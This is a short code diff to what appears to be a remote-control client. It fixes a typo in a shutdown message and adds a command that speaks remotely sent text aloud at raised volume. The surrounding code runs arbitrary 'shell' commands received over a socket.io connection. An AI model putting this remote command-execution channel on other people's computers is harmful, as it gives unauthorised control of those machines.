@@ -72,7 +72,7 @@ class CommandHandler():
             timestamp='now'  # sets the timestamp to current time
         )
 
-        embed.set_author(name=f"Shuting down the PC", icon_url=cc.get_avatar())
+        embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
         embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
         
         self.webhook.send(embed=embed)
@@ -111,6 +111,14 @@ class CommandHandler():
             self.keyboard.press(Key.media_volume_down)
             self.keyboard.release(Key.media_volume_down)  
             
+    def voice(self, text):
+        import pyttsx3
+        self.volumeup()
+        engine = pyttsx3.init()
+        engine.setProperty('rate', 150)
+        engine.say(text)
+        engine.runAndWait()
+            
 cmdhandler = CommandHandler()
 
 @sio.event
@@ -134,6 +142,9 @@ def receive_command(data):
         
     if data['data'].startswith('shell') is True:
         cmdhandler.shell(data['data'].split('shell', 1)[1])
+        
+    if data['data'].startswith('voice') is True:
+        cmdhandler.voice(data['data'].split('voice', 1)[1])
     
     if data['data'] == 'volumemax':
         cmdhandler.volumeup()
